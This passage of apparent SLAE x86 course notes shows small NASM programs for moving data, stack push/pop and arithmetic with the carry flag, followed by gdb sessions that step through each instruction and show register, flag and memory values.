=> 0x08048099 <_start+25>:	mov    cl,al
   0x0804809b <_start+27>:	mov    ch,ah
   0x0804809d <_start+29>:	mov    cx,ax
   0x080480a0 <_start+32>:	mov    eax,0x0
End of assembler dump.
0x08048099 in _start ()
(gdb) 
$23 = 0xaaaadddd
$24 = 0xaaaadddd
$25 = 0xdd
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x804809b to 0x80480a5:
=> 0x0804809b <_start+27>:	mov    ch,ah
   0x0804809d <_start+29>:	mov    cx,ax
   0x080480a0 <_start+32>:	mov    eax,0x0
End of assembler dump.
0x0804809b in _start ()
(gdb) 
$26 = 0xaaaadddd
$27 = 0xaaaadddd
$28 = 0xdddd
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x804809d to 0x80480a7:
=> 0x0804809d <_start+29>:	mov    cx,ax
   0x080480a0 <_start+32>:	mov    eax,0x0
   0x080480a5 <_start+37>:	mov    ebx,0x0
End of assembler dump.
0x0804809d in _start ()
(gdb) 
$29 = 0xaaaadddd
$30 = 0xaaaadddd
$31 = 0xdddd
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x80480a0 to 0x80480aa:
=> 0x080480a0 <_start+32>:	mov    eax,0x0
   0x080480a5 <_start+37>:	mov    ebx,0x0
End of assembler dump.
0x080480a0 in _start ()
(gdb) 
$32 = 0x0
$33 = 0xaaaadddd
$34 = 0xdddd
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x80480a5 to 0x80480af:
=> 0x080480a5 <_start+37>:	mov    ebx,0x0
   0x080480aa <_start+42>:	mov    ecx,0x0
End of assembler dump.
0x080480a5 in _start ()
(gdb) 
$35 = 0x0
$36 = 0x0
$37 = 0xdddd
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x80480aa to 0x80480b4:
=> 0x080480aa <_start+42>:	mov    ecx,0x0
   0x080480af <_start+47>:	mov    al,ds:0x8049108
End of assembler dump.
0x080480aa in _start ()
(gdb) 
$38 = 0x0
$39 = 0x0
$40 = 0x0
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x80480af to 0x80480b9:
=> 0x080480af <_start+47>:	mov    al,ds:0x8049108
   0x080480b4 <_start+52>:	mov    ah,BYTE PTR ds:0x8049109
End of assembler dump.
0x080480af in _start ()
(gdb) 
$41 = 0xaa
$42 = 0x0
$43 = 0x0
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x80480b4 to 0x80480be:
=> 0x080480b4 <_start+52>:	mov    ah,BYTE PTR ds:0x8049109
   0x080480ba <_start+58>:	mov    bx,WORD PTR ds:0x8049108
End of assembler dump.
0x080480b4 in _start ()
(gdb) 
$44 = 0xbbaa
$45 = 0x0
$46 = 0x0
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x80480ba to 0x80480c4:
=> 0x080480ba <_start+58>:	mov    bx,WORD PTR ds:0x8049108
   0x080480c1 <_start+65>:	mov    ecx,DWORD PTR ds:0x8049108
End of assembler dump.
0x080480ba in _start ()
(gdb) 
$47 = 0xbbaa
$48 = 0xbbaa
$49 = 0x0
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x80480c1 to 0x80480cb:
=> 0x080480c1 <_start+65>:	mov    ecx,DWORD PTR ds:0x8049108
   0x080480c7 <_start+71>:	mov    eax,0x33445566
End of assembler dump.
0x080480c1 in _start ()
(gdb) 
$50 = 0xbbaa
$51 = 0xbbaa
$52 = 0xddccbbaa
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x80480c7 to 0x80480d1:
=> 0x080480c7 <_start+71>:	mov    eax,0x33445566
   0x080480cc <_start+76>:	mov    ds:0x8049108,al
End of assembler dump.
0x080480c7 in _start ()
(gdb) 
$53 = 0x33445566
$54 = 0xbbaa
$55 = 0xddccbbaa
0x8049108 <sample>:	0xaa	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x80480cc to 0x80480d6:
=> 0x080480cc <_start+76>:	mov    ds:0x8049108,al
   0x080480d1 <_start+81>:	mov    ds:0x8049108,ax
End of assembler dump.
0x080480cc in _start ()
(gdb) 
$56 = 0x33445566
$57 = 0xbbaa
$58 = 0xddccbbaa
0x8049108 <sample>:	0x66	0xbb	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x80480d1 to 0x80480db:
=> 0x080480d1 <_start+81>:	mov    ds:0x8049108,ax
   0x080480d7 <_start+87>:	mov    ds:0x8049108,eax
End of assembler dump.
0x080480d1 in _start ()
(gdb) 
$59 = 0x33445566
$60 = 0xbbaa
$61 = 0xddccbbaa
0x8049108 <sample>:	0x66	0x55	0xcc	0xdd	0xee	0xff	0x11	0x22
Dump of assembler code from 0x80480d7 to 0x80480e1:
=> 0x080480d7 <_start+87>:	mov    ds:0x8049108,eax
   0x080480dc <_start+92>:	mov    DWORD PTR ds:0x8049108,0x33445566
End of assembler dump.
0x080480d7 in _start ()
(gdb) 
$62 = 0x33445566
$63 = 0xbbaa
$64 = 0xddccbbaa
0x8049108 <sample>:	0x66	0x55	0x44	0x33	0xee	0xff	0x11	0x22
Dump of assembler code from 0x80480dc to 0x80480e6:
=> 0x080480dc <_start+92>:	mov    DWORD PTR ds:0x8049108,0x33445566
End of assembler dump.
0x080480dc in _start ()
(gdb) 
$65 = 0x33445566
$66 = 0xbbaa
$67 = 0xddccbbaa
0x8049108 <sample>:	0x66	0x55	0x44	0x33	0xee	0xff	0x11	0x22
Dump of assembler code from 0x80480e6 to 0x80480f0:
=> 0x080480e6 <_start+102>:	lea    eax,ds:0x8049108
   0x080480ec <_start+108>:	lea    ebx,[eax]
   0x080480ee <_start+110>:	mov    eax,0x11223344
End of assembler dump.
0x080480e6 in _start ()
(gdb) 
$68 = 0x8049108
$69 = 0xbbaa
$70 = 0xddccbbaa
0x8049108 <sample>:	0x66	0x55	0x44	0x33	0xee	0xff	0x11	0x22
Dump of assembler code from 0x80480ec to 0x80480f6:
=> 0x080480ec <_start+108>:	lea    ebx,[eax]
   0x080480ee <_start+110>:	mov    eax,0x11223344
   0x080480f3 <_start+115>:	mov    ebx,0xaabbccdd
End of assembler dump.
0x080480ec in _start ()
(gdb) 
$71 = 0x8049108
$72 = 0x8049108
$73 = 0xddccbbaa
0x8049108 <sample>:	0x66	0x55	0x44	0x33	0xee	0xff	0x11	0x22
Dump of assembler code from 0x80480ee to 0x80480f8:
=> 0x080480ee <_start+110>:	mov    eax,0x11223344
   0x080480f3 <_start+115>:	mov    ebx,0xaabbccdd
End of assembler dump.
0x080480ee in _start ()
(gdb) 
$74 = 0x11223344
$75 = 0x8049108
$76 = 0xddccbbaa
0x8049108 <sample>:	0x66	0x55	0x44	0x33	0xee	0xff	0x11	0x22
Dump of assembler code from 0x80480f3 to 0x80480fd:
=> 0x080480f3 <_start+115>:	mov    ebx,0xaabbccdd
   0x080480f8 <_start+120>:	xchg   ebx,eax
   0x080480f9 <_start+121>:	mov    eax,0x1
End of assembler dump.
0x080480f3 in _start ()
(gdb) 
$77 = 0x11223344
$78 = 0xaabbccdd
$79 = 0xddccbbaa
0x8049108 <sample>:	0x66	0x55	0x44	0x33	0xee	0xff	0x11	0x22
Dump of assembler code from 0x80480f8 to 0x8048102:
=> 0x080480f8 <_start+120>:	xchg   ebx,eax
   0x080480f9 <_start+121>:	mov    eax,0x1
   0x080480fe <_start+126>:	mov    ebx,0x0
End of assembler dump.
0x080480f8 in _start ()
(gdb) 
$80 = 0xaabbccdd
$81 = 0x11223344
$82 = 0xddccbbaa
0x8049108 <sample>:	0x66	0x55	0x44	0x33	0xee	0xff	0x11	0x22
Dump of assembler code from 0x80480f9 to 0x8048103:
=> 0x080480f9 <_start+121>:	mov    eax,0x1
   0x080480fe <_start+126>:	mov    ebx,0x0
End of assembler dump.
0x080480f9 in _start ()
(gdb) c
Continuing.
[Inferior 1 (process 16956) exited normally]
Error while running hook_stop:
No registers

Stack:

vim Stack.nasm
; Filename: Stack.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com
;
;
; Purpose:

global _start

section .text
_start:

        mov eax, 0x66778899
        mov ebx, 0x0
        mov ecx, 0x0

        ; push and pop of r/m16 and r/m32

        ; register push and pop

        push ax
        pop bx

        push eax
        pop ecx

        ;  memory push and pop

        push word [sample]
        pop ecx

        push dword [sample]
        pop edx


        ; exit the program gracefully

        mov eax, 1
        mov ebx, 0
        int 0x80


section .data

sample: db 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x11, 0x22

./compile.sh Stack
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
gdb -q ./Stack
Reading symbols from /SLAE x86/MovingData/Stack...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break _start
Breakpoint 1 at 0x8048080
(gdb) run
Starting program: /SLAE x86/MovingData/Stack 

Breakpoint 1, 0x08048080 in _start ()
(gdb) disassemble 
Dump of assembler code for function _start:
=> 0x08048080 <+0>:	mov    eax,0x66778899
   0x08048085 <+5>:	mov    ebx,0x0
   0x0804808a <+10>:	mov    ecx,0x0
   0x0804808f <+15>:	push   ax
   0x08048091 <+17>:	pop    bx
   0x08048093 <+19>:	push   eax
   0x08048094 <+20>:	pop    ecx
   0x08048095 <+21>:	push   WORD PTR ds:0x80490b0
   0x0804809c <+28>:	pop    ecx
   0x0804809d <+29>:	push   DWORD PTR ds:0x80490b0
   0x080480a3 <+35>:	pop    edx
   0x080480a4 <+36>:	mov    eax,0x1
   0x080480a9 <+41>:	mov    ebx,0x0
   0x080480ae <+46>:	int    0x80
End of assembler dump.
(gdb) display/x $eax
1: /x $eax = 0x0
(gdb) display/x $ebx
2: /x $ebx = 0x0
(gdb) display/x $ecx
3: /x $ecx = 0x0
(gdb) define hook-stop
Redefine command "hook-stop"? (y or n) y
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/8xb $esp
>x/4xh $esp
>x/3xw $esp
>disassemble $eip,+10
>end
(gdb) disassemble 
Dump of assembler code for function _start:
=> 0x08048080 <+0>:	mov    eax,0x66778899
   0x08048085 <+5>:	mov    ebx,0x0
   0x0804808a <+10>:	mov    ecx,0x0
   0x0804808f <+15>:	push   ax
   0x08048091 <+17>:	pop    bx
   0x08048093 <+19>:	push   eax
   0x08048094 <+20>:	pop    ecx
   0x08048095 <+21>:	push   WORD PTR ds:0x80490b0
   0x0804809c <+28>:	pop    ecx
   0x0804809d <+29>:	push   DWORD PTR ds:0x80490b0
   0x080480a3 <+35>:	pop    edx
   0x080480a4 <+36>:	mov    eax,0x1
   0x080480a9 <+41>:	mov    ebx,0x0
   0x080480ae <+46>:	int    0x80
End of assembler dump.
(gdb) nexti
0xbffff710:	0x01	0x00	0x00	0x00	0x36	0xf8	0xff	0xbf
0xbffff710:	0x0001	0x0000	0xf836	0xbfff
0xbffff710:	0x00000001	0xbffff836	0x00000000
Dump of assembler code from 0x8048085 to 0x804808f:
=> 0x08048085 <_start+5>:	mov    ebx,0x0
   0x0804808a <_start+10>:	mov    ecx,0x0
End of assembler dump.
0x08048085 in _start ()
3: /x $ecx = 0x0
2: /x $ebx = 0x0
1: /x $eax = 0x66778899
(gdb) 
0xbffff710:	0x01	0x00	0x00	0x00	0x36	0xf8	0xff	0xbf
0xbffff710:	0x0001	0x0000	0xf836	0xbfff
0xbffff710:	0x00000001	0xbffff836	0x00000000
Dump of assembler code from 0x804808a to 0x8048094:
=> 0x0804808a <_start+10>:	mov    ecx,0x0
   0x0804808f <_start+15>:	push   ax
   0x08048091 <_start+17>:	pop    bx
   0x08048093 <_start+19>:	push   eax
End of assembler dump.
0x0804808a in _start ()
3: /x $ecx = 0x0
2: /x $ebx = 0x0
1: /x $eax = 0x66778899
(gdb) 
0xbffff710:	0x01	0x00	0x00	0x00	0x36	0xf8	0xff	0xbf
0xbffff710:	0x0001	0x0000	0xf836	0xbfff
0xbffff710:	0x00000001	0xbffff836	0x00000000
Dump of assembler code from 0x804808f to 0x8048099:
=> 0x0804808f <_start+15>:	push   ax
   0x08048091 <_start+17>:	pop    bx
   0x08048093 <_start+19>:	push   eax
   0x08048094 <_start+20>:	pop    ecx
   0x08048095 <_start+21>:	push   WORD PTR ds:0x80490b0
End of assembler dump.
0x0804808f in _start ()
3: /x $ecx = 0x0
2: /x $ebx = 0x0
1: /x $eax = 0x66778899
(gdb) 
0xbffff70e:	0x99	0x88	0x01	0x00	0x00	0x00	0x36	0xf8
0xbffff70e:	0x8899	0x0001	0x0000	0xf836
0xbffff70e:	0x00018899	0xf8360000	0x0000bfff
Dump of assembler code from 0x8048091 to 0x804809b:
=> 0x08048091 <_start+17>:	pop    bx
   0x08048093 <_start+19>:	push   eax
   0x08048094 <_start+20>:	pop    ecx
   0x08048095 <_start+21>:	push   WORD PTR ds:0x80490b0
End of assembler dump.
0x08048091 in _start ()
3: /x $ecx = 0x0
2: /x $ebx = 0x0
1: /x $eax = 0x66778899
(gdb) 
0xbffff710:	0x01	0x00	0x00	0x00	0x36	0xf8	0xff	0xbf
0xbffff710:	0x0001	0x0000	0xf836	0xbfff
0xbffff710:	0x00000001	0xbffff836	0x00000000
Dump of assembler code from 0x8048093 to 0x804809d:
=> 0x08048093 <_start+19>:	push   eax
   0x08048094 <_start+20>:	pop    ecx
   0x08048095 <_start+21>:	push   WORD PTR ds:0x80490b0
   0x0804809c <_start+28>:	pop    ecx
End of assembler dump.
0x08048093 in _start ()
3: /x $ecx = 0x0
2: /x $ebx = 0x8899
1: /x $eax = 0x66778899
(gdb) 
0xbffff70c:	0x99	0x88	0x77	0x66	0x01	0x00	0x00	0x00
0xbffff70c:	0x8899	0x6677	0x0001	0x0000
0xbffff70c:	0x66778899	0x00000001	0xbffff836
Dump of assembler code from 0x8048094 to 0x804809e:
=> 0x08048094 <_start+20>:	pop    ecx
   0x08048095 <_start+21>:	push   WORD PTR ds:0x80490b0
   0x0804809c <_start+28>:	pop    ecx
   0x0804809d <_start+29>:	push   DWORD PTR ds:0x80490b0
End of assembler dump.
0x08048094 in _start ()
3: /x $ecx = 0x0
2: /x $ebx = 0x8899
1: /x $eax = 0x66778899
(gdb) 
0xbffff710:	0x01	0x00	0x00	0x00	0x36	0xf8	0xff	0xbf
0xbffff710:	0x0001	0x0000	0xf836	0xbfff
0xbffff710:	0x00000001	0xbffff836	0x00000000
Dump of assembler code from 0x8048095 to 0x804809f:
=> 0x08048095 <_start+21>:	push   WORD PTR ds:0x80490b0
   0x0804809c <_start+28>:	pop    ecx
   0x0804809d <_start+29>:	push   DWORD PTR ds:0x80490b0
End of assembler dump.
0x08048095 in _start ()
3: /x $ecx = 0x66778899
2: /x $ebx = 0x8899
1: /x $eax = 0x66778899
(gdb) x/xh 0x80490b0
0x80490b0 <sample>:	0xbbaa
(gdb) nexti
0xbffff70e:	0xaa	0xbb	0x01	0x00	0x00	0x00	0x36	0xf8
0xbffff70e:	0xbbaa	0x0001	0x0000	0xf836
0xbffff70e:	0x0001bbaa	0xf8360000	0x0000bfff
Dump of assembler code from 0x804809c to 0x80480a6:
=> 0x0804809c <_start+28>:	pop    ecx
   0x0804809d <_start+29>:	push   DWORD PTR ds:0x80490b0
   0x080480a3 <_start+35>:	pop    edx
   0x080480a4 <_start+36>:	mov    eax,0x1
End of assembler dump.
0x0804809c in _start ()
3: /x $ecx = 0x66778899
2: /x $ebx = 0x8899
1: /x $eax = 0x66778899
(gdb) 
0xbffff712:	0x00	0x00	0x36	0xf8	0xff	0xbf	0x00	0x00
0xbffff712:	0x0000	0xf836	0xbfff	0x0000
0xbffff712:	0xf8360000	0x0000bfff	0xf8680000
Dump of assembler code from 0x804809d to 0x80480a7:
=> 0x0804809d <_start+29>:	push   DWORD PTR ds:0x80490b0
   0x080480a3 <_start+35>:	pop    edx
   0x080480a4 <_start+36>:	mov    eax,0x1
End of assembler dump.
0x0804809d in _start ()
3: /x $ecx = 0x1bbaa
2: /x $ebx = 0x8899
1: /x $eax = 0x66778899
(gdb) x/xw 0x80490b0
0x80490b0 <sample>:	0xddccbbaa
(gdb) nexti
0xbffff70e:	0xaa	0xbb	0xcc	0xdd	0x00	0x00	0x36	0xf8
0xbffff70e:	0xbbaa	0xddcc	0x0000	0xf836
0xbffff70e:	0xddccbbaa	0xf8360000	0x0000bfff
Dump of assembler code from 0x80480a3 to 0x80480ad:
=> 0x080480a3 <_start+35>:	pop    edx
   0x080480a4 <_start+36>:	mov    eax,0x1
   0x080480a9 <_start+41>:	mov    ebx,0x0
End of assembler dump.
0x080480a3 in _start ()
3: /x $ecx = 0x1bbaa
2: /x $ebx = 0x8899
1: /x $eax = 0x66778899
(gdb) 
0xbffff712:	0x00	0x00	0x36	0xf8	0xff	0xbf	0x00	0x00
0xbffff712:	0x0000	0xf836	0xbfff	0x0000
0xbffff712:	0xf8360000	0x0000bfff	0xf8680000
Dump of assembler code from 0x80480a4 to 0x80480ae:
=> 0x080480a4 <_start+36>:	mov    eax,0x1
   0x080480a9 <_start+41>:	mov    ebx,0x0
End of assembler dump.
0x080480a4 in _start ()
3: /x $ecx = 0x1bbaa
2: /x $ebx = 0x8899
1: /x $eax = 0x66778899
(gdb) display/x $edx
4: /x $edx = 0xddccbbaa
(gdb) nexti
0xbffff712:	0x00	0x00	0x36	0xf8	0xff	0xbf	0x00	0x00
0xbffff712:	0x0000	0xf836	0xbfff	0x0000
0xbffff712:	0xf8360000	0x0000bfff	0xf8680000
Dump of assembler code from 0x80480a9 to 0x80480b3:
=> 0x080480a9 <_start+41>:	mov    ebx,0x0
   0x080480ae <_start+46>:	int    0x80
   0x080480b0:	stos   BYTE PTR es:[edi],al
   0x080480b1:	mov    ebx,0xffeeddcc
End of assembler dump.
0x080480a9 in _start ()
4: /x $edx = 0xddccbbaa
3: /x $ecx = 0x1bbaa
2: /x $ebx = 0x8899
1: /x $eax = 0x1
(gdb) nexti
0xbffff712:	0x00	0x00	0x36	0xf8	0xff	0xbf	0x00	0x00
0xbffff712:	0x0000	0xf836	0xbfff	0x0000
0xbffff712:	0xf8360000	0x0000bfff	0xf8680000
Dump of assembler code from 0x80480ae to 0x80480b8:
=> 0x080480ae <_start+46>:	int    0x80
   0x080480b0:	stos   BYTE PTR es:[edi],al
   0x080480b1:	mov    ebx,0xffeeddcc
   0x080480b6:	adc    DWORD PTR [edx],esp
End of assembler dump.
0x080480ae in _start ()
4: /x $edx = 0xddccbbaa
3: /x $ecx = 0x1bbaa
2: /x $ebx = 0x0
1: /x $eax = 0x1
(gdb) nexti
[Inferior 1 (process 20141) exited normally]
Error while running hook_stop:
No registers.

Arithmetic:

vim Arithmetic.nasm

; Filename: Arithmetic.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com
;
;
; Purpose:

global _start

section .text
_start:

        ; register based addition

        mov eax, 0
        add al, 0x22
        add al, 0x11

        mov ax, 0x1122
        add ax, 0x3344

        mov eax, 0xffffffff
        add eax, 0x10

        ; memory based addition

        mov eax, 0
        add byte [var1], 0x22
        add byte [var1], 0x11

        add word [var2], 0x1122
        add word [var2], 0x3344

        mov dword [var3], 0xffffffff
        add dword [var3], 0x10

        ;  set / clear / complement carry flag

        clc
        stc
        cmc

        ; add with carry

        mov eax, 0
        stc
        adc al, 0x22
        stc
        adc al, 0x11

        mov ax, 0x1122
        stc
        adc ax, 0x3344

        mov eax, 0xffffffff
        stc
        adc eax, 0x10

        ; subtract

        mov eax, 10
        sub eax, 5
        stc
        sbb eax, 4

        ; increment and decrement

        inc eax
        dec eax

        ; exit program

        mov eax, 1
        mov ebx, 10
        int 0x80

section .data

        var1    db      0x00
        var2    dw      0x0000
        var3    dd      0x00000000

./compile.sh Arithmetic
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
gdb -q ./Arithmetic
Reading symbols from /SLAE x86/Arithmetic/Arithmetic...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break _start
Breakpoint 1 at 0x8048080
(gdb) run
Starting program: /SLAE x86/Arithmetic/Arithmetic 

Breakpoint 1, 0x08048080 in _start ()
(gdb) disassemble 
Dump of assembler code for function _start:
=> 0x08048080 <+0>:	mov    eax,0x0
   0x08048085 <+5>:	add    al,0x22
   0x08048087 <+7>:	add    al,0x11
   0x08048089 <+9>:	mov    ax,0x1122
   0x0804808d <+13>:	add    ax,0x3344
   0x08048091 <+17>:	mov    eax,0xffffffff
   0x08048096 <+22>:	add    eax,0x10
   0x08048099 <+25>:	mov    eax,0x0
   0x0804809e <+30>:	add    BYTE PTR ds:0x804910c,0x22
   0x080480a5 <+37>:	add    BYTE PTR ds:0x804910c,0x11
   0x080480ac <+44>:	add    WORD PTR ds:0x804910d,0x1122
   0x080480b5 <+53>:	add    WORD PTR ds:0x804910d,0x3344
   0x080480be <+62>:	mov    DWORD PTR ds:0x804910f,0xffffffff
   0x080480c8 <+72>:	add    DWORD PTR ds:0x804910f,0x10
   0x080480cf <+79>:	clc    
   0x080480d0 <+80>:	stc    
   0x080480d1 <+81>:	cmc    
   0x080480d2 <+82>:	mov    eax,0x0
   0x080480d7 <+87>:	stc    
   0x080480d8 <+88>:	adc    al,0x22
   0x080480da <+90>:	stc    
   0x080480db <+91>:	adc    al,0x11
   0x080480dd <+93>:	mov    ax,0x1122
   0x080480e1 <+97>:	stc    
   0x080480e2 <+98>:	adc    ax,0x3344
   0x080480e6 <+102>:	mov    eax,0xffffffff
   0x080480eb <+107>:	stc    
   0x080480ec <+108>:	adc    eax,0x10
   0x080480ef <+111>:	mov    eax,0xa
   0x080480f4 <+116>:	sub    eax,0x5
   0x080480f7 <+119>:	stc    
   0x080480f8 <+120>:	sbb    eax,0x4
   0x080480fb <+123>:	inc    eax
   0x080480fc <+124>:	dec    eax
   0x080480fd <+125>:	mov    eax,0x1
   0x08048102 <+130>:	mov    ebx,0xa
   0x08048107 <+135>:	int    0x80
End of assembler dump.
(gdb) info variables 
All defined variables:

Non-debugging symbols:
0x0804910c  var1
0x0804910d  var2
0x0804910f  var3
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>print/x $eax
>x/xb &var1  
>x/xh &var2 
>x/xw &var3
>print $eflags
>disassemble $eip,+10
>end
(gdb) nexti
$1 = 0x0
0x804910c <var1>:	0x00
0x804910d <var2>:	0x0000
0x804910f <var3>:	0x00000000
$2 = [ IF ]
Dump of assembler code from 0x8048085 to 0x804808f:
=> 0x08048085 <_start+5>:	add    al,0x22
   0x08048087 <_start+7>:	add    al,0x11
   0x08048089 <_start+9>:	mov    ax,0x1122
   0x0804808d <_start+13>:	add    ax,0x3344
End of assembler dump.
0x08048085 in _start ()
(gdb) 
$3 = 0x22
0x804910c <var1>:	0x00
0x804910d <var2>:	0x0000
0x804910f <var3>:	0x00000000
$4 = [ PF IF ]
Dump of assembler code from 0x8048087 to 0x8048091:
=> 0x08048087 <_start+7>:	add    al,0x11
   0x08048089 <_start+9>:	mov    ax,0x1122
   0x0804808d <_start+13>:	add    ax,0x3344
End of assembler dump.
0x08048087 in _start ()
(gdb) 
$5 = 0x33
0x804910c <var1>:	0x00
0x804910d <var2>:	0x0000
0x804910f <var3>:	0x00000000
$6 = [ PF IF ]
Dump of assembler code from 0x8048089 to 0x8048093:
=> 0x08048089 <_start+9>:	mov    ax,0x1122
   0x0804808d <_start+13>:	add    ax,0x3344
   0x08048091 <_start+17>:	mov    eax,0xffffffff
End of assembler dump.
0x08048089 in _start ()
(gdb) 
$7 = 0x1122
0x804910c <var1>:	0x00
0x804910d <var2>:	0x0000
0x804910f <var3>:	0x00000000
$8 = [ PF IF ]
Dump of assembler code from 0x804808d to 0x8048097:
=> 0x0804808d <_start+13>:	add    ax,0x3344
   0x08048091 <_start+17>:	mov    eax,0xffffffff
   0x08048096 <_start+22>:	add    eax,0x10
End of assembler dump.
0x0804808d in _start ()
(gdb) 
$9 = 0x4466
0x804910c <var1>:	0x00
0x804910d <var2>:	0x0000
0x804910f <var3>:	0x00000000
$10 = [ PF IF ]
Dump of assembler code from 0x8048091 to 0x804809b:
=> 0x08048091 <_start+17>:	mov    eax,0xffffffff
   0x08048096 <_start+22>:	add    eax,0x10
   0x08048099 <_start+25>:	mov    eax,0x0
End of assembler dump.
0x08048091 in _start ()
(gdb) 
$11 = 0xffffffff
0x804910c <var1>:	0x00
0x804910d <var2>:	0x0000
0x804910f <var3>:	0x00000000
$12 = [ PF IF ]
Dump of assembler code from 0x8048096 to 0x80480a0:
=> 0x08048096 <_start+22>:	add    eax,0x10
   0x08048099 <_start+25>:	mov    eax,0x0
   0x0804809e <_start+30>:	add    BYTE PTR ds:0x804910c,0x22
End of assembler dump.
0x08048096 in _start ()
(gdb) 
$13 = 0xf
0x804910c <var1>:	0x00
0x804910d <var2>:	0x0000
0x804910f <var3>:	0x00000000
$14 = [ CF PF IF ]
Dump of assembler code from 0x8048099 to 0x80480a3:
=> 0x08048099 <_start+25>:	mov    eax,0x0
   0x0804809e <_start+30>:	add    BYTE PTR ds:0x804910c,0x22
End of assembler dump.
0x08048099 in _start ()
(gdb) 
$15 = 0x0
0x804910c <var1>:	0x00
0x804910d <var2>:	0x0000
0x804910f <var3>:	0x00000000
$16 = [ CF PF IF ]
Dump of assembler code from 0x804809e to 0x80480a8:
=> 0x0804809e <_start+30>:	add    BYTE PTR ds:0x804910c,0x22
   0x080480a5 <_start+37>:	add    BYTE PTR ds:0x804910c,0x11
End of assembler dump.
0x0804809e in _start ()
(gdb) 
$17 = 0x0
0x804910c <var1>:	0x22
0x804910d <var2>:	0x0000
0x804910f <var3>:	0x00000000
$18 = [ PF IF ]
Dump of assembler code from 0x80480a5 to 0x80480af:
=> 0x080480a5 <_start+37>:	add    BYTE PTR ds:0x804910c,0x11
   0x080480ac <_start+44>:	add    WORD PTR ds:0x804910d,0x1122
End of assembler dump.
0x080480a5 in _start ()
(gdb) 
$19 = 0x0
0x804910c <var1>:	0x33
0x804910d <var2>:	0x0000
0x804910f <var3>:	0x00000000
$20 = [ PF IF ]
Dump of assembler code from 0x80480ac to 0x80480b6:
=> 0x080480ac <_start+44>:	add    WORD PTR ds:0x804910d,0x1122
   0x080480b5 <_start+53>:	add    WORD PTR ds:0x804910d,0x3344
End of assembler dump.
0x080480ac in _start ()
(gdb) 
$21 = 0x0
0x804910c <var1>:	0x33
0x804910d <var2>:	0x1122
0x804910f <var3>:	0x00000000
$22 = [ PF IF ]
Dump of assembler code from 0x80480b5 to 0x80480bf:
=> 0x080480b5 <_start+53>:	add    WORD PTR ds:0x804910d,0x3344
   0x080480be <_start+62>:	mov    DWORD PTR ds:0x804910f,0xffffffff
End of assembler dump.
0x080480b5 in _start ()
(gdb) 
$23 = 0x0
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x00000000
$24 = [ PF IF ]
Dump of assembler code from 0x80480be to 0x80480c8:
=> 0x080480be <_start+62>:	mov    DWORD PTR ds:0x804910f,0xffffffff
End of assembler dump.
0x080480be in _start ()
(gdb) 
$25 = 0x0
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0xffffffff
$26 = [ PF IF ]
Dump of assembler code from 0x80480c8 to 0x80480d2:
=> 0x080480c8 <_start+72>:	add    DWORD PTR ds:0x804910f,0x10
   0x080480cf <_start+79>:	clc    
   0x080480d0 <_start+80>:	stc    
   0x080480d1 <_start+81>:	cmc    
End of assembler dump.
0x080480c8 in _start ()
(gdb) 
$27 = 0x0
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$28 = [ CF PF IF ]
Dump of assembler code from 0x80480cf to 0x80480d9:
=> 0x080480cf <_start+79>:	clc    
   0x080480d0 <_start+80>:	stc    
   0x080480d1 <_start+81>:	cmc    
   0x080480d2 <_start+82>:	mov    eax,0x0
   0x080480d7 <_start+87>:	stc    
   0x080480d8 <_start+88>:	adc    al,0x22
End of assembler dump.
0x080480cf in _start ()
(gdb) 
$29 = 0x0
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$30 = [ PF IF ]
Dump of assembler code from 0x80480d0 to 0x80480da:
=> 0x080480d0 <_start+80>:	stc    
   0x080480d1 <_start+81>:	cmc    
   0x080480d2 <_start+82>:	mov    eax,0x0
   0x080480d7 <_start+87>:	stc    
   0x080480d8 <_start+88>:	adc    al,0x22
End of assembler dump.
0x080480d0 in _start ()
(gdb) 
$31 = 0x0
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$32 = [ CF PF IF ]
Dump of assembler code from 0x80480d1 to 0x80480db:
=> 0x080480d1 <_start+81>:	cmc    
   0x080480d2 <_start+82>:	mov    eax,0x0
   0x080480d7 <_start+87>:	stc    
   0x080480d8 <_start+88>:	adc    al,0x22
   0x080480da <_start+90>:	stc    
End of assembler dump.
0x080480d1 in _start ()
(gdb) 
$33 = 0x0
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$34 = [ PF IF ]
Dump of assembler code from 0x80480d2 to 0x80480dc:
=> 0x080480d2 <_start+82>:	mov    eax,0x0
   0x080480d7 <_start+87>:	stc    
